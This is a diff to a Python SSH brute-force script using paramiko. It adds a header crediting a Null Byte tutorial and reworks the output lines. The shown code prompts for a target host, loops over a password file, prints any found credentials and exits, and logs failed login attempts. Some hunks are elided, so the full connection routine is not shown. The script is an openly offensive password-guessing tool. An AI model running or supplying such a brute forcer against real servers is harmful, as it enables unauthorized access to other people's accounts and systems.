@@ -1,7 +1,11 @@
+# 
+# SSH Brute Forcer with Password File
+# Credit to SERGEANT SPLOIT https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
+#
 import paramiko, sys, os, socket
-global host, username, line, input_file#, numcount
+global host, username, line, input_file
 
-line = '\n-------------------------------------------------------------------\n'
+line = '\n-----------------------------------------------------\n'
 
 try:
 	host = raw_input("[*] Enter Target Host Address: ")
@@ -45,10 +49,7 @@ for i in input_file.readlines():
 			print("%s[+%s] User: %s [+%s] Pass Found: %s%s" % (line, numcount, username, numcount, password, line))
 			sys.exit(0)
 		elif response == 1:
-#			username = str(username)
-#			password = str(password)
-			print "{%s} User: %s {%s} Pass: %s --> Login Incorrect <--" % (numcount, username, numcount, password)
-#			print("[*] User: %s [*] Pass: %s => Login Incorrect !!! <=" % (username, password))
+			print("[" + str(numcount) + "]" + " User: " + str(username) + " [" + str(numcount) + "]" + " Incorrect Pass: " + str(password))
 		elif response == 2:
 			print("[*] Connection Could Not Be Established To Address: %s" % (host))
 			sys.exit(2)
